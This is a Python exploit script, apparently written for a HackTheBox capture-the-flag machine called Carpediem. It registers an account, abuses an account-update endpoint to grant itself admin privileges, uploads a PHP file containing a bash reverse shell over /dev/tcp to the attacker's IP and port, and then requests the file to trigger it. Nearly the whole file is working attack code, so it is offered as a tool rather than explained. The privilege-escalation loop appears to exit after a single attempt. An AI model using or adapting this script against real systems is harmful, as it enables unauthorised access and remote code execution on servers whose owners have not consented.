import json
import random
import requests # pip install requests
import signal
import string
import sys
import threading

# variables
target_host = '10.10.11.167' 
target_url = 'http://portal.carpediem.htb' # configure DNS (/etc/hosts)

IP = sys.argv[1]
PORT = sys.argv[2]

# ctrl+C (exit the script) 
def ctrl_handler(signum, frame):
	print('\n[!] User Exit.'); sys.exit(1)

signal.signal(signal.SIGINT, ctrl_handler)

# get random string (to create account)
def get_randstr(length):
    return ''.join(random.choice(string.ascii_letters) for i in range(length))

# register user
def register(session):
	user = get_randstr(5)
	headers = {'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}
	post_data = '&'.join((
		'firstname={data}', 
		'lastname={data}', 
		'contact={data}', 
		'gender=Male', 
		'address=', 
		'username={data}', 
		'password={data}')).format(data=user)

	session.post(f'{target_url}/classes/Master.php?f=register', data=post_data, headers=headers)

	return user

# login user
def login(session, credentials):
	headers = {'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}
	post_data = '&'.join((
		'username={data}',
		'password={data}')).format(data=credentials)

	session.post(f'{target_url}/classes/Login.php?f=login_user', data=post_data, headers=headers)

# change privileges
def change_privileges(session, user, user_id):
	headers = {'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}
	post_data = '&'.join((
		'id={id}',
		'login_type=1', # admin privileges (default=2)
		'firstname={data}',
		'lastname={data}',
		'contact={data}',
		'gender=Male',
		'address=',
		'username={data}',
		'password=')).format(data=user, id=user_id)
	
	r = session.post(f'{target_url}/classes/Master.php?f=update_account', data=post_data, headers=headers)
	
	if 'success' not in r.text:
		return False
	else:
		return True

# reverse shell
def reverse_shell(session):
	# listen to rev
	print('Open port {p} to receive the shell (g.e /usr/bin/nc -lvnp {p})'.format(p=PORT))
	input('Press any key to continue...')
	headers = {'Content-Type' : 'multipart/form-data; boundary=123456789'}
	post_data = """--123456789\r\nContent-Disposition: form-data; name="file_upload"; filename="rev_shell.php"\r\n\n<?php exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/{}/{} 0>&1'"); ?>\r\n--123456789""".format(IP, PORT)

	r = session.post(f'{target_url}/classes/Users.php?f=upload', data=post_data, headers=headers)
		
	file_name = str(json.loads(r.text)['success']).split()[0]

	session.get(f'{target_url}/{file_name}')

# make request
def request():
	try:
		# create session
		s = requests.Session()
		s.get(target_url)

		# register
		user = register(s)
		# login
		login(s, user)
		
		# change account_type value
		user_id = 0
		change_priv_thread = False
		while not change_priv_thread:
			change_priv_thread = threading.Thread(target=change_privileges, args=(s, user, user_id))
			change_priv_thread.start()
			user_id += 1

		# get reverse shell
		reverse_shell(s)

	except Exception as e:
		print('[x] %s' % e); sys.exit(1)


if __name__ == '__main__':
	request()
